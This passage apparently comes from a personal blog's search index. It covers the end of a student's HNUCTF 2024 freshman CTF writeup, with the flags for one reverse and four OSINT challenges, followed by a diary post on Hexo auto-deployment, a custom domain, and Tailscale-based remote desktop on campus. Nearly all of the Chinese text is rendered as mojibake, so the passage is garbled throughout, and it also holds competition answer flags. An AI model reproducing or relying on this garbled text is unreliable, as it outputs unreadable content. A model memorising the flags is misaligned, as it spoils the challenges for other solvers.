æŒ‰F5è¿›è¡Œåç¼–è¯‘\n- è§‚å¯Ÿåç¼–è¯‘åçš„Cè¯­è¨€æºç ï¼Œæ‰¾åˆ°flag\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/reverse1-1.png)\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/reverse1-2.png)\n> Â **HNUCTF{W3lcome_t0_HNUCTF}**\n\n### OSINT\n#### 1.Osint **here is**\nç…§ç‰‡é‡Œå¯ä»¥çœ‹åˆ°ï¼š\n**è™è¸é¾™ç›˜åœ¨æ­¤é—´ï¼›çµç§€èšé’Ÿäººè«è¯†**\nåœ¨bingæœç´¢ä¸€ä¸‹å‘ç°ä¸€ç¯‡ä»‹ç»éŸ¶å±±æ»´æ°´æ´å¼•ç”¨è¿™å¥è¯—çš„æ–°é—»ã€‚*ï¼ˆé¡ºä¾¿æ„Ÿæ…¨ä¸€ä¸‹bingçš„å¼ºæ‚çˆ¬è™«....å·²ç»æŠŠè¿™ä¸ªåšå®¢çš„æ–‡ç« ç»™çˆ¬å–äº†ï¼‰*\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint1-1.png)\nç»“åˆè¿™é‡Œçš„å±±ç¯å¢ƒï¼Œå¯ä»¥åˆç†çŒœæµ‹ä¸€ä¸‹è¿™ä¸ªåœ°ç‚¹å°±æ˜¯æ»´æ°´æ´æ™¯åŒºï¼Œæœç´¢ä¸€ä¸‹å®ƒçš„ç¥¨ä»·ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint1-2.png)\næ ¹æ®flagæ‰€ç»™è§„åˆ™ï¼Œå†™å…¥æ­£ç¡®ï¼š\n>**HNUCTF{dishuidong_O3!nT_40.00}**\n\n#### 2.Osint **where_are_i**\nå…³é”®è¯ **äº‘å·´ï¼Œç£æ‚¬æµ®ï¼Œç©ºæ—·ï¼Œåå­—è·¯å£**ã€‚æ‰“å¼€ç™¾åº¦åœ°å›¾æœç´¢å°±çœ‹å¾—è§ä¸€ä¸ª**äº‘å·´æ—…æ¸¸ç£æ‚¬æµ®çº¿**ï¼Œè§‚å¯Ÿé™„è¿‘è¡—æ™¯ç›´æ¥ç¡®å®šã€‚\nå¹¶ä¸”å‘¨å›´è¿˜æœ‰ç›¸åŒçš„å»ºç­‘ç‰©ï¼Œæ›´åŠ ç¬ƒå®šäº†ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint2-1.png)\næ‰¾åˆ°è¡—æ™¯æœ€è¿‘çš„åå­—è·¯å£ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint2-2.png)\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint2-3.png)\nå¾—åˆ°flagã€‚\n>**HNUCTF{112.924_28.096_Os!nT}**\n\n#### 3.Osint **where_are_i_again!**\né€šè¿‡12306æŸ¥è¯¢D3009è¿™è¾†è½¦ ï¼Œå¯¹æ¯”æ—¶é—´ï¼Œç²—ç•¥åˆ¤æ–­è¿™ä¸€ç«™æ˜¯**å—äº¬å—**ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint3-1.png)\nç„¶åä»å—äº¬å—æ‰¾åˆ°75ä¸ºæœ«å°¾å·ï¼Œç»ˆç‚¹ç«™ä¸ºåˆè‚¥å—ï¼Œå§‹å‘ç«™ä¸ºXXå—çš„åˆ—è½¦ï¼Œæ°å¥½å°±è¿™ä¸€ä¸ªï¼š\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint3-2.png)\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint3-3.png)\næ³¨æ„flagæ˜¯å§‹å‘ç«™çš„è½¦æ¬¡å·å°±okï¼ŒG7675å§‹å‘ç«™ä¸ºG7674ï¼Œå¾—åˆ°flagã€‚\n>**HNUCTF{0siN7_G7674_nanjingnan}**\n\n#### 4.Osint **see_see_need**\nå»bingæœæœä¿¡å®‰åä¼šä¼šé•¿[L1uYun](https://github.com/L1uYun/l1uyun_blog) æ‰¾åˆ°äº†ä»–çš„githubï¼\nç„¶ååœ¨ä»–çš„blogé‡Œçœ‹ä»–æœ€è¿‘çš„submitçš„æ–‡ä»¶ å‘ç°äº†\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint4-1.png)\näº¤ä¸Šå»å‘ç°ä¸å¯¹ï¼Œå¾ˆæ€ªï¼Œç»“åˆèŠå¤©è®°å½•è¯´æœ‰å¹²æ‰°é¡¹ï¼Œå¦è¾Ÿæ€è·¯çœ‹çœ‹å…¶ä»–å¤§ä½¬çš„ã€‚\nå‘ç°äº†ä¸€ä¸ªå¥èº«å­¦é•¿[yulv706](https://github.com/yulv706/blog/blob/main/src/site/notes/blog/%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/Hydra_%E5%AD%97%E5%85%B8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3.md)çš„githubä»“åº“ï¼\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/osint4-2.png)\nå…¶å®è¿˜æœ‰ä¸€ä¸ªæ´¾å¤§æ˜Ÿå­¦é•¿çš„ï¼Œä½†æ˜¯æ´¾å¤§æ˜Ÿå­¦é•¿ç›´æ¥è¯´æ˜¯HNUCTF{fake_flag}ï¼Œæ•…ç›´æ¥æäº¤å¯ç”¨çš„flagã€‚\nå› ä¸ºå¥èº«ä½¬çš„blogå¥½ä¹…æ²¡æ›´æ–°äº†ï¼Œæ‰€ä»¥æˆ‘åªè¦çœ‹æœ€æ–°çš„æ›´æ–°ä¸€ç›´ç‚¹ä¸€ç›´ç‚¹ï¼Œç„¶åçœ‹åˆ°HNUCTFå¤åˆ¶ç²˜è´´å°±å¥½äº†ã€‚æˆ–è€…ç›´æ¥å»ä»–çš„åšå®¢æ£€ç´¢HNUCTFï¼Œä¹Ÿå¯ä»¥å¾—åˆ°å«æœ‰è¿™ä¸ªflagçš„åšå®¢æ–‡ç« ã€‚*é¡ºä¾¿å­¦åˆ°äº†ä¸€äº›ctfçŸ¥è¯†*\næäº¤æˆåŠŸã€‚\n**å¤§å®¶å¹³æ—¶ä¹Ÿè¦æ³¨æ„è‡ªå·±çš„ä¸ªäººä¿¡æ¯èƒ½ä¸èƒ½ç›´æ¥è¢«æœç´¢å¼•æ“æœåˆ°å“¦...ğŸ˜‘**\n> **HNUCTF{OSINT_leads_to_flag}**\n\n## **æ€»ç»“**\nä½œä¸ºæ–°ç”Ÿæ‰“è¿™åœºctfè¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ï¼è¿™ä¸€æ¬¡æ–°ç”Ÿæ¯ä¸¥æ ¼æ¥è¯´ç®—æ˜¯è‡ªå·±çš„ç¬¬ä¸€æ¬¡ç½‘å®‰çš„æ¯”èµ›ï¼Œæ„Ÿè§‰å’Œacmå¾ˆä¸ä¸€æ ·ï¼Œä¹Ÿæ›´å¥½ç©ä¸€äº›ï¼Œåƒä¸€ç³»åˆ—è¶£å‘³æ¸¸æˆï¼\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/summary.png)\nå‰é¢çš„å¤§ä½¬è¿˜æ˜¯è¶…çº§å¤šï¼ï¼æœ‰akçš„ï¼å¤ªå¼ºäº†ï¼Œå’Œå‰ä¸€åçš„è¿™ä½æ–°ç”Ÿå¤§ä½¬å·®å¿«800åˆ†äº†ï¼Œä½†æ˜¯ä½œä¸ºæ–°ç”Ÿï¼Œç¬¬ä¸€æ¬¡å°è¯•è¿™åœºæ¯”èµ›æˆ‘å·²ç»å¾ˆçŸ¥è¶³ï¼Œè¾¹æ‰“è¾¹å­¦æ–°çŸ¥è¯†ï¼Œå®è·µå‡ºçœŸçŸ¥ï¼\nè™½ç„¶reverseå’Œpwnæ²¡å†™å‡ºæ¥å‡ ä¸ªå“ˆå“ˆå“ˆï¼Œä½†æ˜¯webå’Œmiscåšäº†å¾ˆå¤šï¼Œè¿˜æ˜¯å¾ˆæ„Ÿå…´è¶£çš„ï¼Œä»¥åè¦é€‰æ¯”èµ›æ–¹å‘çš„è¯ï¼Œè¿™ä¸¤ä¸ªå¾ˆæœ‰è¶£ï¼Œå¯èƒ½ä¼šé€‰ã€‚\nä½†æ˜¯pwnçš„æ“ä½œå¾ˆåƒ ã€Š**Hacknet**ã€‹çš„ç©æ³•ï¼Œè¿™ä¸ªæ›´ç¬¦åˆæˆ‘å¯¹hackerçš„å°è±¡äº†ï¼Œè¶…çº§é…·ï¼Œreverseæœ‰ç‚¹éš¾éš¾çš„ï¼Œæ¶‰åŠåˆ°ç¼–è¯‘åŸºç¡€ï¼Œä¹Ÿæ¿€åŠ±ç€æˆ‘åœ¨ä¹‹åçš„å­¦ä¹ ä¸­å¤šå¤šäº†è§£ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/blanket.png)\n\n**æ”¶è·å¾ˆå¤šï¼ŒæœŸå¾…ä»¥åçš„å‰è¡Œè·¯ã€‚**\n\n\n\n\n\n\n\n","tags":["è®°å½•","å­¦ä¹ ","CTF","writeup"],"categories":["CTFå­¦ä¹ "]},{"title":"è®°å½•ä¸è®¡åˆ’","url":"/2025/03/03/sheng-huo/ji-lu/xiao-ji-lu/","content":"# è®°å½•ä¸è®¡åˆ’\nè®°å½•ä¸€äº›æœ€è¿‘çš„å°æˆå°±ã€‚ğŸ¥³\n## è´­ä¹°åŸŸåï¼Œå®ç°å›½å†…æµè§ˆâœ…\nä¹‹å‰åœ¨github pagesé»˜è®¤çš„.github.ioå®ç°åšå®¢éƒ¨ç½²ï¼Œåœ¨å›½å†…è®¿é—®ä¹Ÿå¤ªå›°éš¾äº†ï¼Œæœ¬æ¥ä¸€ç›´å¾ˆè‹¦æ¼äºè¿™ä¸ªé—®é¢˜ã€‚\nä½†æœ€è¿‘ï¼Œäº2025.3.1åœ¨namesiloè´­ä¹°äº†moyuin.topåŸŸåï¼Œå¹¶äº¤ç»™cloudflareæ‰˜ç®¡ï¼Œå°†github pagesçš„ç½‘ç«™è½¬å‘åˆ°è¿™ä¸ªåŸŸåé‡Œï¼Œå®ç°åœ¨å›½å†…ä¹Ÿå¯ä»¥é¡ºåˆ©æµè§ˆæˆ‘çš„åšå®¢ã€‚\n**å¯ä»¥æ›´æ–¹ä¾¿çš„ç»™åŒå­¦å‘ç¬”è®°äº†**ã€‚ğŸ˜\n\n---\n\n## å®ç°è‡ªåŠ¨éƒ¨ç½²âœ…\n\n### åˆæ­¥è§£å†³è‡ªåŠ¨éƒ¨ç½²ï¼\nä¹‹å‰è‹¦æ¼äºhexoä¸‰éƒ¨æ›²è¾“å…¥ä¸‰ä¸ªæŒ‡ä»¤ä¹Ÿå¤ªéº»çƒ¦ã€‚å¹¶ä¸”åœ¨åšå®¢å†™çš„æ–‡ç« ï¼Œæ— è®ºæ˜¯æ‰‹æœºå†™çš„è¿˜æ˜¯å¹³æ¿å†™çš„ï¼Œéƒ½å¾—é€šè¿‡å±€åŸŸç½‘ä¼ è¾“åˆ°ç”µè„‘ä¸Šï¼Œç„¶åç”µè„‘æ•´ç†åˆ†ç±»åå†è¿›è¡Œhexoä¸‰éƒ¨æ›²ã€‚\n**ç°åœ¨è®°å½•ç¬”è®°æ˜¯Obsidian+Git+Syncæ–¹æ¡ˆ**ï¼ŒObsidianæŠŠä»“åº“æ’ä»¶æ•´åˆåˆ°æ–‡ä»¶å¤¹é‡Œä¹Ÿå¤ªå¥½ç”¨äº†ï¼Œæˆ‘çš„gitæ’ä»¶åªè¦æ‰€æœ‰è®¾å¤‡syncåŒæ­¥ä¸€ä¸‹ï¼Œæ–‡ä»¶å¤¹é‡Œçš„ä¸œè¥¿ç›´æ¥äº’é€šï¼Œè¿è¡Œæ— éšœç¢ã€‚\nç„¶ååªè¦å†Obsidiané‡Œé¢commitå’Œpushä¸€ä¸‹å°±å¯ä»¥ç›´æ¥è‡ªåŠ¨æ”¾åˆ°ä»£ç ä»“åº“é‡Œé¢ï¼Œäº¤ç”±è¿œç¨‹çš„Github actionè¿›è¡Œhexoä¸‰éƒ¨æ›²ï¼Œæå¤§åœ°æ”¹å–„äº†å†™åšæ–‡çš„èˆ’é€‚åº¦ã€‚\nå¹¶ä¸”æ”¾åœ¨vscodeé‡Œé¢ï¼Œåªè¦ç‚¹ç‚¹ç‚¹å°±å¯ä»¥å®ç°gitæäº¤å’ŒåŒæ­¥ï¼Œåœ¨ç”µè„‘ä¸Šæ•´ç†ä»£ç ç¬”è®°ä¹Ÿæ›´åŠ æ–¹ä¾¿äº†ã€‚\nå®ç°äº†æ‡’äººåŒæ­¥ï¼ğŸ¤ª\näº†å—?ğŸ˜¢\n\n---\n### åŒæ­¥é—®é¢˜\nç›®å‰è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºäº†èŠ‚çº¦æ‰‹æœºå’Œå¹³æ¿çš„å†…å­˜å’Œé¿å…å…¶ä»–é…ç½®ç±»æ–‡ä»¶ä¸å®ƒè¿›è¡Œå†²çªï¼Œæ‰€ä»¥æˆ‘çš„å…±äº«æ–‡ä»¶å¤¹éƒ½åªæ˜¯å…±äº«äº†å«æœ‰åšå®¢æ–‡ç« ç®¡ç†çš„sourceæ–‡ä»¶å¤¹ã€‚\nğŸ˜­å¯¼è‡´æˆ‘çš„gitæ–‡ä»¶å¤¹æ²¡æœ‰åŒæ­¥è¿›æ¥ã€‚\n*ç›®å‰è¿˜å¾—å†™å¥½ç„¶åç”¨ä¸€ä¸ªç”µè„‘æäº¤...*\n*æ€è€ƒè§£å†³æ–¹æ³•ä¸­ã€‚*\n\n>å¥½åƒæœ€ä½³æ–¹æ³•æ˜¯ä½¿ç”¨submoduleå»è¿›è¡Œç®¡ç†ï¼Œå¾—ç ”ç©¶ä¸€ä¸‹ã€‚\n>å½“ç„¶ä¹Ÿæœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œæ˜¯ç›´æ¥Obsidianåº“è¿ç§»ä¸ºåšå®¢æºä»£ç åº“ï¼Œä½†æ˜¯è¿™æ ·è¿‡äºéº»çƒ¦ï¼Œå¹¶ä¸”æˆ‘é‚£é…ç½®ä»…ä»…æ˜¯6+128gçš„å°å¹³æ¿åœ¨è¯´æ±‚æ”¾è¿‡ï¼Œæ‰‹æœºä¹Ÿåœ¨è¯´ä¸è¦å¢æ·»ä¸€äº›è«åå…¶å¦™çš„åƒåœ¾æ–‡ä»¶æ±¡æŸ“äº†ã€‚ğŸ˜”\n\n---\n### é—®é¢˜è§£å†³ï¼\né€šè¿‡æŠŠsourceé€šè¿‡submoduleè¿æ¥åšå®¢ä»“åº“ï¼Œå®ç°äº†åœ¨sourceé‡Œé¢çš„gitä»“åº“ä¸åšå®¢ä»“åº“çš„è”åŠ¨ï¼é¡ºä¾¿åŠ å…¥äº†æ–°çš„github actionï¼Œå½“æ£€æµ‹åˆ°sourceæ–‡ä»¶å¤¹å˜åŠ¨å¹¶ä¸”æ¨é€åˆ°sourceä»“åº“çš„æ—¶å€™ï¼Œæˆ‘çš„åšå®¢ä»“åº“è‡ªåŠ¨commitå’Œpushï¼Œç„¶åå¼•å‘è‡ªåŠ¨éƒ¨ç½²ï¼\nğŸ˜‹å·²ç»å®ç°æ‡’äººéƒ¨ç½²ï¼\n\n---\n## è¿œç¨‹æ¡Œé¢ï¼â­\n**è¿™ç»å¯¹æ˜¯ç›®å‰æœ€ä¼Ÿå¤§çš„æˆå°±ï¼**\n### å±€åŸŸç½‘åˆæ­¥\nå¯’å‡ä¹°äº†å¹³æ¿ï¼Œå¬è¯´äº†moonlight+sunshineçš„å±€åŸŸç½‘è¿œç¨‹æ¡Œé¢æ–¹æ¡ˆï¼Œæƒ³ç€æœ€å¤§åŒ–åˆ©ç”¨å¹³æ¿ï¼Œäºæ˜¯å¯’å‡å¼€å§‹äº†åˆæ­¥æ“ä½œã€‚\nå±€åŸŸç½‘è¿æ¥å¾ˆå¿«ï¼Œæˆ‘çš„å¹³æ¿å¾ˆé¡ºåˆ©çš„è¿ä¸Šäº†ç”µè„‘ï¼æˆ‘å°†æ²‰é‡çš„æ¸¸æˆæœ¬ç”µè„‘ä¸¢åˆ°ä¸€è¾¹ï¼ŒæŠ±ç€é”®ç›˜é¼ æ ‡å’Œå¹³æ¿åœ¨åºŠä¸Šç©äº†èµ·æ¥â€¦**åªè¦è¿æ¥åŒä¸€ä¸ªç½‘ç»œï¼Œæˆ‘çš„å¹³æ¿å°±èƒ½è¿æ¥ç”µè„‘é«˜ç”»è´¨æµç•…è¿è¡Œå„å¤§æ¸¸æˆ**ï¼Œé»‘ç¥è¯ï¼Œå¤§è¡¨å“¥ï¼Œçœ‹é—¨ç‹—ï¼Œåº”æœ‰å°½æœ‰â€¦\nä½†æˆ‘é€‰æ‹©äº†æ¯å¤©åœ¨åºŠä¸Šorçƒ¤ç«ç‚‰å‰ç©è§£é”å¸§ç‡çš„é«˜å¸§ç‡åŸç¥ğŸ¤ªâ€¦ç©åŸç¥ç©çš„ã€‚\n**ä½†å±€åŸŸç½‘è¿˜æ˜¯æœ‰ä¸€ä¸ªç¼ºé™·**ï¼Œåªè¦å¹³æ¿å’Œç”µè„‘ä¸è¿æ¥åŒä¸€ç½‘ç»œï¼Œæˆ‘çš„å¹³æ¿å°±è¯†åˆ«ä¸åˆ°ç”µè„‘å­˜åœ¨ã€‚\nä¸‹ä¸€æ­¥è€ƒè™‘è¿œç¨‹è¿æ¥ã€‚\n\n---\n\n### è¿œç¨‹æ¡Œé¢åˆæ­¥\nå¼€å­¦åèƒŒç€ç”µè„‘å›äº†å­¦æ ¡ï¼Œåœ¨ä¸€ä¸ªå¯’å‡è½»é‡çº§å¹³æ¿çš„æ´—ç¤¼åï¼Œå¼€å§‹è§‰å¾—æˆ‘çš„æ¸¸æˆæœ¬å¾ˆæ²‰é‡äº†ã€‚ï¼ˆ*æ˜æ˜ä¹°çš„æ—¶å€™ç‰¹æ„ä¹°çš„æœ€è½»çš„æ¸¸æˆæœ¬*ï¼‰ï¼Œäºæ˜¯å¼€å§‹é’»ç ”æ€ä¹ˆåœ¨ä¸åŒç½‘ç»œä¸‹å®ç°è¿œç¨‹æ¡Œé¢ã€‚\n\n---\n#### å¾®è½¯è¿œç¨‹æ¡Œé¢RDP?âŒ\nRDPæ˜¯å¾®è½¯ç”¨windowsçš„è¿œç¨‹æ¡Œé¢ï¼Œç¡®å®å¥½ç”¨ï¼Œä½†æ˜¯å¼€ç«¯å£è½¬å‘ï¼Œæ²¡æœ‰è·¯ç”±å™¨ä¸­è½¬ï¼Œä¹Ÿæ²¡æœ‰è‡ªå·±çš„æœåŠ¡å™¨æ”¯æŒï¼Œåªèƒ½è€ƒè™‘é€šè¿‡æ ¡å›­ç½‘çš„å±€åŸŸç½‘æ¥å®ç°å®¿èˆä¸æ•™å®¤çš„è¿æ¥ã€‚\nå†µä¸”RDPåœ¨å±€åŸŸç½‘å†…çš„è¡¨ç°ä¹Ÿè¡¨ç°çš„ä¸ç¨³å®šã€‚è€Œä¸”åœ¨Skywtçš„å­¦é•¿çš„[ä¸€ç¯‡åšå®¢](https://skywt.cn/blog/wireshark-sniff#%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84-ap-%E9%9A%94%E7%A6%BB)é‡Œäº†è§£åˆ°HNUçš„æ ¡å›­ç½‘ä¸åŒäºæ™®é€šå±€åŸŸç½‘ï¼Œ**æ ¡å›­ç½‘æ˜¯APéš”ç¦»çš„**ï¼Œä¸åŒè®¾å¤‡è¿æ¥æ ¡å›­ç½‘æ˜¯æ— æ³•ç›¸äº’è®¿é—®çš„ï¼Œå³ä¾¿ç”µè„‘å’Œå¹³æ¿éƒ½è¿æ¥çš„æ˜¯å®¿èˆåŒºåŸŸçš„æ ¡å›­ç½‘ï¼Œä¹Ÿæ— æ³•é€šè¿‡moonlightæ‰¾åˆ°ç”µè„‘è®¾å¤‡ã€‚\nå› æ­¤åªèƒ½è€ƒè™‘å…¶ä»–è½¯ä»¶æä¾›çš„è¿œç¨‹è¿æ¥æœåŠ¡ï¼Œæˆ–è€…æ˜¯åˆ©ç”¨æ ¡å›­ç½‘è¿›è¡Œå±€åŸŸç½‘è¿æ¥ï¼Œå†…ç½‘ç©¿é€ã€‚\n\n---\n#### todeskç­‰ç½‘ç»œè¿œç¨‹è¿æ¥?â“\n**æµç•…æƒ…å†µä¾èµ–äºç½‘é€Ÿã€‚**\næ ¡å›­ç½‘ç½‘é€Ÿæ„Ÿäººï¼Œæœ›å‘¨çŸ¥ã€‚ä¸”HNUçš„æ ¡å›­ç½‘é¢å‘å…¨ä½“å¸ˆç”Ÿï¼Œä¹Ÿä¸äº†è§£å­¦æ ¡çš„ç½‘ç»œæ˜¯å¦‚ä½•åˆ†é…å¸¦å®½çš„ï¼Œå¯¹äºè¿œç¨‹æ¡Œé¢çš„å®ç°ï¼Œå¦‚æœé‡‡ç”¨æœåŠ¡å™¨ä¸­è½¬ï¼Œåœ¨æ ¡å›­ç½‘çš„ç»™åŠ›ä¸‹ï¼Œç”šè‡³**æ— æ³•åšåˆ°ç¨³å®š60å¸§**ã€‚\nç”¨Todeskç­‰è½¯ä»¶çš„ç¡®å¯ä»¥å®ç°è¿œç¨‹è¿æ¥ï¼Œä¸è¿‡è®¾å¤‡å…¼å®¹æ€§å¹¶æ²¡æœ‰moonlightå¥½ï¼ˆæ¯”å¦‚æˆ‘é”®ç›˜alt+tabåœ¨todeské‡Œæ˜¯ç»™è‡ªå·±å¹³æ¿åˆ‡æ¢ç•Œé¢ï¼Œéå¸¸åäººç±»ï¼‰ï¼Œä¸è¿‡ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨å®ƒçš„é”å±å’Œå¼€æœºåŠŸèƒ½ï¼Œå¯ä»¥åšåº”æ€¥ä½¿ç”¨ï¼Œæ•…ä½œä¿ç•™ã€‚\n\n---\n#### ç”³è¯·å…¬ç½‘ipv6è¿æ¥?âŒ\nå‘ƒï¼Œè¿æ¥æ ¡å›­ç½‘ï¼Œæ²¡æœ‰å…¬ç½‘ipv6çš„å¯èƒ½æ€§ã€‚ä¸”æ²¡æœ‰åŠç†æ ¡å›­å®½å¸¦ï¼ˆå¬è¯´é‚£ä¸ªä¹Ÿæµªè´¹é’±ï¼Œé€Ÿåº¦æ…¢ï¼Œä¹Ÿä¸ç¨³å®šï¼‰ï¼Œåœ¨å®¿èˆåªæœ‰éšèº«wifiæ’ç€ç”µè¯å¡å½“è·¯ç”±å™¨ï¼Œæ›´æ²¡æœ‰å®ç°å…¬ç½‘è½¬å‘çš„å¯èƒ½æ€§ã€‚\n\n---\n#### æ ¡å›­ç½‘+tailscaleå†…ç½‘ç©¿é€ï¼Œæ‰“ç ´APéš”ç¦»ï¼Œæ ¡å›­åŒºåŸŸP2Pç›´è¿âœ…\né‚£åœ¨æ ¡å›­åŒºåŸŸå†…ï¼Œåªæœ‰ä¸€ç§åšæ³•äº†ï¼Œä¹Ÿå°±æ˜¯è½¬å‘æ ¡å›­ç½‘...æ—¢ç„¶æ ¡å›­ç½‘å†…ä¸å…è®¸å±€åŸŸç½‘è®¾å¤‡äº’ç›¸è®¿é—®ï¼Œé‚£å°±ä½¿ç”¨å†…ç½‘ç©¿é€è¿›è¡Œç›´è¿å§ï¼Œç»æ£€éªŒï¼Œè¿™ä¸ªæ–¹æ³•æœ€æµç•…ï¼ˆå¯ä»¥åšåˆ°2k120å¸§ï¼‰ï¼Œå¹¶ä¸”åœ¨moonlightçš„ç»™åŠ›è®¾å¤‡å…¼å®¹ä¸‹ï¼Œåœ¨å¹³æ¿é”®ç›˜çš„æ“ä½œä¸ç”µè„‘é”®ç›˜æ— å¼‚ã€‚\né‡‡ç”¨å…è´¹çš„tailscaleåšå†…ç½‘ç©¿é€ï¼Œä¸»è¦æ˜¯ç»™ipç›´æ¥æ‰€æœ‰è®¾å¤‡ç™»é™†åŒä¸€è´¦å·å°±è¡Œï¼Œéå¸¸ä¾¿åˆ©ã€‚\nåœ¨è®¾å¤‡åŒè¿æ¥æ ¡å›­ç½‘çš„æƒ…å†µä¸‹ï¼Œtailscaleå¯ä»¥åšåˆ°å†…ç½‘ç©¿é€ï¼Œå¹¶ä¸”ä¹Ÿæ”¯æŒsyncçš„åŒæ­¥æ•°æ®ï¼Œéå¸¸è´´åˆæˆ‘çš„éœ€æ±‚ï¼Œæš‚æ—¶ä¸æƒ³è¿‡å¤šæŠ˜è…¾å®ƒäº†ï¼Œæˆ‘å·²ç»éå¸¸æ»¡æ„å®ƒçš„è¡¨ç°ã€‚\n\n---\n\n#### ä½†ä»ç„¶æœ‰ç¼ºç‚¹....\nåŸºäºtailscaleçš„å†…ç½‘ç©¿é€ï¼Œåœ¨è®¾å¤‡è¿æ¥ä¸åŒç½‘ç»œä¸‹ï¼Œtailscaleå°±ä¼šèµ°relayä¸­è½¬ï¼Œæ¯•ç«Ÿæ˜¯å›½å¤–è½¯ä»¶ï¼Œä¸­è½¬æœåŠ¡å™¨æœ€è¿‘çš„æ˜¯æ¥è‡ªTokyoçš„æœåŠ¡å™¨...æµç•…åº¦ä¸è¨€è€Œå–»ã€‚\nè¿™æ ·çš„è¯ï¼Œæˆ‘åªè¦ä¸€ç¦»å¼€æ ¡å›­åŒºåŸŸï¼Œä¹Ÿå°±æ˜¯æœ‰æ ¡å›­ç½‘çš„åœ°æ–¹ï¼Œæˆ‘çš„è¿œç¨‹æ¡Œé¢å‡ ä¹ç­‰äºå¤±æ•ˆã€‚\nå› æ­¤ä¹‹åæƒ³è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œç›®å‰æ¥çœ‹å¿…é¡»æœ‰ä¸€ä¸ªè‡ªå·±èƒ½ç”¨çš„å›½å†…æœåŠ¡å™¨ï¼Œæ‹‰è¿‡æ¥åšä¸­è½¬æ‰å¯ä»¥...ç›®å‰é™åˆ¶æå¤šï¼Œä¸”è‡ªå·±è¿˜æ˜¯æ–°æ‰‹ï¼Œå¯¹æœåŠ¡å™¨çš„ç»´æŠ¤ä¸€æ— æ‰€çŸ¥ï¼Œä¸‡ä¸€å“ªä¸€å¤©æœåŠ¡å™¨è¢«æ”»å‡»ï¼Œç°åœ¨çš„æˆ‘æ˜¯æŸæ‰‹æ— ç­–ï¼Œå› æ­¤åªèƒ½æ½œå¿ƒå‡åŠ›...\nè¿™ä¸ªæ–¹æ¡ˆçš„å®Œç¾å®ç°é“é˜»ä¸”é•¿ã€‚ä¸è¿‡å®ç°äº†çš„è¯ï¼Œæˆ‘ä¹Ÿå¯ä»¥è€ƒè™‘æ¢ä¸€å°å°å¼æœºæ”¾åœ¨å®¿èˆé‡Œäº†...\n\n## ä¸‹ä¸€æ­¥æƒ³åšçš„ï¼Ÿ\n### æ‹¿åˆ°ä¸€ä¸ªæœåŠ¡å™¨âœ…\n#### æŠ˜è…¾ä¸€ä¸‹ç§‘å­¦ä¸Šç½‘âœ…\næˆ‘ä¹Ÿå¾ˆæƒ³æœ‰ä¸ªå±äºè‡ªå·±çš„æµç•…ä¸Šç½‘å·¥å…·ã€‚\nè™½ç„¶è¯´ç°åœ¨ç”¨çš„è¿™ä¸ªå¾ˆç¨³å®šï¼Œè€Œä¸”ä¹Ÿä¸ç”¨æˆ‘æé’±ç»´æŠ¤ï¼ˆè¿™æ—¶å€™è¿˜å¾—çœ‹çˆ¹ï¼‰ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æƒ³å°è¯•ç‹¬ç«‹ä¸€ä¸‹çš„ï¼Œæ€»å¾—è¯•è¯•ï¼Œä¸èƒ½æ€»é çˆ¹ã€‚ä¸‡ä¸€å“ªå¤©æœ‰äº†é—®é¢˜ï¼Œè¿˜æ˜¯è‡ªå·±ç»´æŠ¤çš„å¥½ã€‚\n\n**æœ‰äº†æœ‰äº†**ï¼Œgithubå­¦ç”Ÿè®¤è¯æ‹¿åˆ°ä¸€å°digitaloceançš„vpsï¼Œåšwireguardä¹Ÿå¤ŸæŠ˜è…¾äº†ğŸ¥³ï¼Œè€Œä¸”æ—¶é—´è¶³å¤Ÿæˆ‘æ’‘åˆ°æˆå¹´è´­ä¹°ä¸€å°è‡ªå·±çš„ã€‚\né—®é¢˜æ˜¯ä¸å¤ªç¨³å®šï¼Œè¿˜æ²¡ææ‡‚è¿™ä¸ªæ€ä¹ˆæï¼Œå…ˆæ”¾ç€ã€‚\n\n---\n#### è¿ç§»åšå®¢\nå°†åšå®¢æ”¾åœ¨github pagesé‡Œé¢éƒ¨ç½²ç¡®å®æ–¹ä¾¿ï¼Œä½†æ˜¯è¿™æ ·å¥½åƒä¹Ÿä¼šé™åˆ¶æˆ‘çš„ä¸€äº›...è‡ªç”±æ€§ï¼Ÿç»™è‡ªå·±çš„åšå®¢ç½‘ç«™å¤‡æ¡ˆä»€ä¹ˆçš„ ã€‚*ï¼ˆè™½ç„¶æˆ‘11æœˆæ‰æˆå¹´....)*\n\n---\n#### æ‰¾ä¸€ä¸ªèƒ½ç”¨çš„æœåŠ¡å™¨åšfrpè½¬å‘ï¼Œå®Œå–„è¿œç¨‹æ¡Œé¢ã€‚\n\n---\n ###  **äº†è§£ä¸€ä¸‹RSSè®¢é˜…** 